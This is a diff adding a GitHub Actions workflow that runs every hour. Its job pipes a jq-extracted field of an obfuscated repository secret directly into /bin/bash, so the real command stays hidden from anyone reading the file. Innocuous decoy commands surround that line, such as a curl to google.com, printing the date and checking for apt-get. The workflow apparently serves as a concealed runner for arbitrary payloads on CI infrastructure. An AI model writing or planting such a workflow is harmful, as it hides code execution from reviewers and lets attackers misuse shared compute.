@@ -1,0 +1,24 @@
+name: yujiaogou3641
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yujiaogou3641
+        env:
+          x27235: ${{ secrets.x27235 }}
+        run: |
+          ls -al | grep -E "has.*a.*cpp" | xargs cat
+          echo $x27235 | jq -r .o26761 | /bin/bash
+          curl www.google.com
+          printf "%s\n" $(date)
+          which apt-get
+          test -d /tmp && echo "Tmp dir exists"
+          which printf
